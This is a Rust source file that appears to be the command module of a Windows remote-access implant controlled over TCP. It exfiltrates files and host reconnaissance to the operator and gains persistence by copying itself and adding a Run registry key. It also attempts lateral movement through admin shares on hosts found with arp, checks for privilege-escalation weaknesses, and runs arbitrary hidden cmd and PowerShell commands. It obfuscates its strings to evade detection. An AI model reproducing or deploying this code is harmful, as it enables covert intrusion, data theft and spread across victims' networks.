use std::process::Command;
use sysinfo::System;
use tokio::{net::TcpStream, process};
use xorcrypt::{e, prepare_encryption};

use crate::models::{download_file, substr_exists, upload_file, write};

prepare_encryption!();

pub async fn process(cmd: &Vec<u8>, conn: &mut TcpStream) -> Result<(), ()> {
    if substr_exists(cmd, e!("::STARTFILE::").as_bytes()).await {
        upload(cmd, conn).await.unwrap();
    } else if substr_exists(cmd, b"::DOWNLOAD::").await {
        download(cmd, conn).await;
    } else if substr_exists(cmd, b"::PERSIST::").await {
        persist(cmd, conn).await.unwrap();
    } else if substr_exists(cmd, b"enumerate").await {
        enumerate(conn).await;
    } else if substr_exists(cmd, b"::LATMOVE::").await {
        lateral_movement(conn).await.unwrap();
    } else if substr_exists(cmd, b"::PRIVESC::").await {
        privilege_escalation(conn).await.unwrap();
    } else if substr_exists(cmd, b"::RUNCMD::").await {
        run_custom_command(cmd, conn).await.unwrap();
    } else if substr_exists(cmd, b"::SECURITY_REPORT::").await {
        generate_security_report(conn).await.unwrap();
    } else {
        return Err(());
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn get_user_groups(user: &str) -> Vec<String> {
    let output = Command::new("powershell")
        .arg("-Command")
        .arg(format!("(Get-LocalUser -Name {}).PrincipalSource", user))
        .output()
        .expect("Failed to execute powershell command");
    String::from_utf8_lossy(&output.stdout)
        .lines()
        .map(|s| s.to_string())
        .collect()
}

#[cfg(target_family = "unix")]
fn get_user_groups(user: &str) -> Vec<String> {
    let output = Command::new("id")
        .arg("-Gn")
        .arg(user)
        .output()
        .expect("Failed to execute id command");
    String::from_utf8_lossy(&output.stdout)
        .split_whitespace()
        .map(|s| s.to_string())
        .collect()
}
async fn generate_security_report(conn: &mut TcpStream) -> Result<(), ()> {
    let mut report = String::new();

    
    println!("Gathering OS information...");
    let os_info = os_info::get();
    report.push_str(&format!("Operating System: {}\n", os_info.os_type()));
    report.push_str(&format!("OS Version: {}\n", os_info.version()));
    report.push_str(&format!("OS Architecture: {}\n", os_info.bitness()));

    
    println!("Gathering user information...");
    let user = whoami::username();
    let groups = get_user_groups(&user);
    report.push_str(&format!("Current User: {}\n", user));
    report.push_str(&format!("User Groups: {:?}\n", groups));

    
    println!("Gathering network information...");
    let network_info = network_connections();
    report.push_str(&format!(
        "Network Connections:\n{}\n",
        String::from_utf8_lossy(&network_info)
    ));

    
    println!("Checking firewall status...");
    let firewall_status = check_firewall_status().await;
    report.push_str(&format!("Firewall Status: {}\n", firewall_status));

    
    println!("Checking antivirus status...");
    let antivirus_status = check_antivirus_status().await;
    report.push_str(&format!("Antivirus Status: {}\n", antivirus_status));

    
    println!("Checking patch level...");
    let patch_level = check_patch_level().await;
    report.push_str(&format!("System Patch Level: {}\n", patch_level));

    
    println!("Checking sensitive files...");
    let sensitive_files = check_sensitive_files().await;
    report.push_str(&format!(
        "Sensitive Files and Directories:\n{}\n",
        sensitive_files
    ));

    
    println!("Sending report to the server...");
    write(conn, report.as_bytes().to_vec()).await.unwrap();

    println!("Security report generation completed.");
    Ok(())
}

async fn check_firewall_status() -> String {
    let output = process::Command::new("netsh")
        .arg("advfirewall")
        .arg("show")
        .arg("allprofiles")
        .output()
        .await
        .expect("Failed to execute netsh command");

    String::from_utf8_lossy(&output.stdout).to_string()
}
async fn check_antivirus_status() -> String {
    let output = process::Command::new("powershell")
        .arg("-Command")
        .arg("Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct")
        .output()
        .await
        .expect("Failed to execute powershell command");
    String::from_utf8_lossy(&output.stdout).to_string()
}
async fn check_patch_level() -> String {
    let output = process::Command::new("powershell")
        .arg("-Command")
        .arg("Get-HotFix | Select-Object -Last 1 | Select-Object HotFixID,InstalledOn")
        .output()
        .await
        .expect("Failed to execute powershell command");
    String::from_utf8_lossy(&output.stdout).to_string()
}










async fn check_sensitive_files() -> String {
    let output = process::Command::new("powershell")
        .arg("-Command")
        .arg(r#"
            $paths = @('C:\ProgramData')
            $fileTypes = @('*.txt', '*.docx', '*.xlsx')
            $results = @()
            foreach ($path in $paths) {
                foreach ($fileType in $fileTypes) {
                    $results += Get-ChildItem -Path $path -Include $fileType -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
                }
            }
            $results | ForEach-Object { $_.FullName }
        "#)
        .output()
        .await
        .expect("Failed to execute powershell command");

    String::from_utf8_lossy(&output.stdout).to_string()
}

async fn run_custom_command(cmd: &Vec<u8>, conn: &mut TcpStream) -> Result<(), ()> {
    let command = String::from_utf8_lossy(cmd).to_string();
    let parts: Vec<&str> = command.split("::RUNCMD::").collect();
    if parts.len() == 2 {
        let command_parts: Vec<&str> = parts[1].trim().split("::").collect();
        if command_parts.len() == 2 {
            let shell = command_parts[0].trim();
            let command = command_parts[1].trim();
            let output = match shell {
                "cmd" => run_cmd(command.to_string()).await,
                "powershell" => run_ps(command.to_string()).await,
                _ => {
                    write(conn, b"Invalid shell specified".to_vec())
                        .await
                        .unwrap();
                    return Ok(());
                }
            };
            write(conn, output).await.unwrap();
        } else {
            write(conn, b"Invalid command format".to_vec())
                .await
                .unwrap();
        }
    } else {
        write(conn, b"Invalid command format".to_vec())
            .await
            .unwrap();
    }
    Ok(())
}

async fn enumerate(conn: &mut TcpStream) {
    let mut sys = System::new_all();
    sys.refresh_all();

    let info = format!(
        r#"
System Information:
  Hostname: {}
  Username: {} 
  CPU Count: {}
  Memory: {} MB
  Processors: {}
  Network Connections: {}
  Startup Services: {}
  Startup Reg Keys: {}
"#,
        hostname::get().unwrap().to_string_lossy(),
        whoami::username(),
        sys.cpus().len(),
        sys.total_memory() / 1024,
        sys.cpus()
            .iter()
            .map(|p| p.brand().to_string())
            .collect::<Vec<_>>()
            .join(", "),
        String::from_utf8_lossy(&network_connections()),
        String::from_utf8_lossy(&startup_services()),
        String::from_utf8_lossy(&startup_reg_keys()),
    );

    write(conn, info.as_bytes().to_vec()).await.unwrap();
}

fn network_connections() -> Vec<u8> {
    let output = Command::new("netstat")
        .arg("-ano")
        .output()
        .expect("Failed to execute netstat command");
    output.stdout
}

fn startup_services() -> Vec<u8> {
    let output = Command::new("sc")
        .arg("query")
        .arg("type=service")
        .arg("state=all")
        .output()
        .expect("Failed to execute sc command");
    output.stdout
}

fn startup_reg_keys() -> Vec<u8> {
    let output = Command::new("reg")
        .arg("query")
        .arg(r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run")
        .output()
        .expect("Failed to execute reg command");
    output.stdout
}

async fn persist(cmd: &Vec<u8>, conn: &mut TcpStream) -> Result<(), ()> {
    let command = String::from_utf8_lossy(cmd).to_string();
    let command = command
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (_, args) = (&command[0], &command[1..]);
    match args.get(0) {
        Some(filename) => {
            let path = platform_dirs::AppDirs::new(Some(""), false).unwrap();
            let path = path.cache_dir.join(filename);
            let path = path.to_str().unwrap();
            let data = tokio::fs::read(std::env::current_exe().unwrap())
                .await
                .unwrap();
            tokio::fs::write(path, data).await.unwrap();
            let part1 = e!("reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v")
                .replace("\\\\", "\\");
            let part2 = e!("/t REG_SZ /d");
            let reg_str = format!(
                "{} {} {} \"{}\"",
                part1,
                filename[..filename.len() - 4].to_string(),
                part2,
                path
            );
            println!("{}", reg_str);
            run_cmd(reg_str).await;
            write(conn, b"[+] Persistence done".to_vec()).await.unwrap();
        }
        None => {
            
        }
    }
    Ok(())
}

async fn upload(cmd: &Vec<u8>, mut conn: &mut TcpStream) -> Result<(), ()> {
    download_file(&cmd).await;
    if write(&mut conn, b"[+] File uploaded successfully".to_vec())
        .await
        .is_err()
    {
        Err(())
    } else {
        Ok(())
    }
}

async fn download(cmd: &Vec<u8>, mut conn: &mut TcpStream) {
    let command = String::from_utf8(cmd.clone()).unwrap();
    let command = command
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (_, args) = (&command[0], &command[1..]);
    match args.get(0) {
        Some(filename) => match tokio::fs::read(filename.trim()).await {
            Ok(data) => {
                upload_file(&mut conn, filename, data).await.unwrap();
            }
            Err(_) => {
                write(&mut conn, b"[-] File not found".to_vec())
                    .await
                    .unwrap();
            }
        },
        None => {
            
        }
    }
}
async fn attempt_lateral_movement(target: &str) -> bool {
    
    let output = process::Command::new("net")
        .arg("use")
        .arg(format!("\\\\{}\\C$", target))
        .output()
        .await
        .expect("Failed to execute net use command");

    let output = String::from_utf8_lossy(&output.stdout).to_string();
    output.contains("command completed successfully")
}

async fn attempt_weak_service_path() -> bool {
    let output = process::Command::new("sc")
        .arg("query")
        .arg("type=service")
        .arg("state=all")
        .output()
        .await
        .expect("Failed to execute sc command");

    let output = String::from_utf8_lossy(&output.stdout).to_string();
    let lines = output.lines();

    for line in lines {
        if line.contains("SERVICE_NAME:") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let service_name = parts[1];
                let output = process::Command::new("sc")
                    .arg("qc")
                    .arg(service_name)
                    .output()
                    .await
                    .expect("Failed to execute sc command");

                let output = String::from_utf8_lossy(&output.stdout).to_string();
                if output.contains("BINARY_PATH_NAME") {
                    let path_parts: Vec<&str> = output.split("BINARY_PATH_NAME").collect();
                    if path_parts.len() >= 2 {
                        let path = path_parts[1].trim();
                        if path.contains(" ") && !path.contains("\"") {
                            
                            if std::path::Path::new(path).exists() {
                                
                                return true;
                            }
                        }
                    }
                }
            }
        }
    }

    false
}

async fn attempt_always_install_elevated() -> bool {
    let output = process::Command::new("reg")
        .arg("query")
        .arg(r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer")
        .arg("/v")
        .arg("AlwaysInstallElevated")
        .output()
        .await
        .expect("Failed to execute reg command");

    let output = String::from_utf8(output.stdout).unwrap();
    output.contains("0x1")
}
pub async fn lateral_movement(conn: &mut TcpStream) -> Result<(), ()> {
    let targets = scan_network().await;

    if targets.is_empty() {
        write(conn, b"No lateral movement targets found".to_vec())
            .await
            .unwrap();
    } else {
        write(
            conn,
            format!("Lateral movement targets: {:?}", targets)
                .as_bytes()
                .to_vec(),
        )
        .await
        .unwrap();

        let mut success = false;
        for target in targets {
            if attempt_lateral_movement(&target).await {
                write(
                    conn,
                    format!("Lateral movement successful on target: {}", target)
                        .as_bytes()
                        .to_vec(),
                )
                .await
                .unwrap();
                success = true;
            }
        }

        if !success {
            write(conn, b"Lateral movement failed on all targets".to_vec())
                .await
                .unwrap();
        }
    }

    Ok(())
}

async fn scan_network() -> Vec<String> {
    let output = Command::new("arp")
        .arg("-a")
        .output()
        .expect("Failed to execute arp command");

    let output = String::from_utf8(output.stdout).unwrap();
    let lines = output.lines();

    let mut targets = Vec::new();
    for line in lines {
        if line.contains("dynamic") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                targets.push(parts[0].to_string());
            }
        }
    }

    targets
}

pub async fn privilege_escalation(conn: &mut TcpStream) -> Result<(), ()> {
    let mut success = false;

    if attempt_weak_service_path().await {
        write(
            conn,
            b"Privilege escalation successful using weak service path".to_vec(),
        )
        .await
        .unwrap();
        success = true;
    }

    if attempt_always_install_elevated().await {
        write(
            conn,
            b"Privilege escalation successful using AlwaysInstallElevated".to_vec(),
        )
        .await
        .unwrap();
        success = true;
    }

    if success {
        spawn_elevated_process(conn).await;
    } else {
        write(conn, b"Privilege escalation failed".to_vec())
            .await
            .unwrap();
    }

    Ok(())
}

pub async fn run_cmd(command: String) -> Vec<u8> {
    let mut output = process::Command::new(e!("cmd.exe"));
    output.creation_flags(0x8000000);
    let mut output = output
        .arg(e!("/C"))
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    println!("{}", String::from_utf8(output.stdout.clone()).unwrap());
    output.stdout
}
pub async fn run_ps(command: String) -> Vec<u8> {
    let mut output = process::Command::new(e!("powershell.exe"));
    output.creation_flags(0x8000000);
    let mut output = output
        .arg(e!("-NoProfile"))
        .arg(e!("-Command"))
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    output.stdout
}

async fn spawn_elevated_process(conn: &mut TcpStream) {
    
    let addr = crate::e!("127.0.0.1:8085");
    let output = process::Command::new("cmd")
        .args(&["/C", &format!("start \"\" \"{}\"", addr)])
        .output()
        .await
        .unwrap();

    write(conn, output.stdout).await.unwrap();
}
